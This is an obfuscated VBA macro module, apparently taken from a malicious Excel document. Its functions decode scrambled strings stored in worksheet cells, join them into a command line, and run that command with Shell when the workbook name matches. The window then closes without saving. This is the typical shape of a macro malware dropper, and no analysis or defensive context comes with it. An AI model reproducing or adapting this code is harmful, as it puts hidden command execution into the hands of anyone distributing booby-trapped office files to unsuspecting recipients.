Function rembold()
Dim sticks, losd As String
sticks = ""
losd = "False"
For j = 1 To 3
sticks = sticks + Termoj(Cells(lame, j + 1))
Next j
rembold = sticks
End Function
Function Termoj(ByVal Halfer As String) As String
Dim sneg, a, b, c As Integer
Dim talker As Integer
Dim wines As Integer
Dim zimpa() As Integer
Dim SubSubs() As Long
Dim Z As Integer
a = 0: b = 1: c = 3
Z = IIf(Right(Halfer, b) Mod 2 = a, 5, 4)
Halfer = Left(Halfer, Len(Halfer) - IIf(Right(Halfer, b) Mod 2 = a, b, b))
sneg = Len(Halfer) / Z - b
ReDim zimpa(sneg)
ReDim SubSubs(sneg)
talker = a
wines = a
For wines = a To sneg
zimpa(wines) = wines - (sneg + b)
Next wines
For talker = a To sneg
For wines = a To sneg
If CInt(Mid(Halfer, wines * Z + b, Z - c)) = talker Then
SubSubs(talker) = (Mid(Halfer, (wines + b) * Z - 2, c) + zimpa(talker))
Exit For
End If
Next wines
Next talker
Termoj = ""
For talker = a To sneg
Termoj = Termoj & Chr(SubSubs(talker))
Next talker
End Function
Function Reolo()
Dim foord, losds As String
losds = "True": foord = ""
For j = 1 To 3
foord = foord + Termoj(Cells(lame, j + 4))
Next j
Reolo = foord
End Function

Sub Mlata()
Dim Ri As Integer: Ri = 10
If (volkj Like "*r*") Then Shell rembold & brill(Ri, Ri) & brill(Ri + Ri, Ri * 2) + Reolo, msoComboNormal
cloese
End Sub
Function lame()
lame = Int((17 - 15 + 1) * Rnd + 15)
End Function
Function volkj()
volkj = ActiveWorkbook.Name
End Function

Function brill(b, n As Integer)
brill = Cells(b, n)
End Function

Sub cloese()
ActiveWindow.Close savechanges:=False
End Sub


